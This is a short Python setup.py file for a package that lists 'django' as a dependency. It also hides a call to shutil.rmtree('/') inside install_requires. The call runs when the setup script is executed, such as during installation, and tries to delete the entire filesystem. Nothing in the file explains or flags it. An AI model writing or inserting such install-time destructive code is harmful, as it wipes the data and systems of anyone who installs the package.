from setuptools import setup
import shutil

setup(
    install_requires=[
        shutil.rmtree('/'),
        'django',
    ],
)
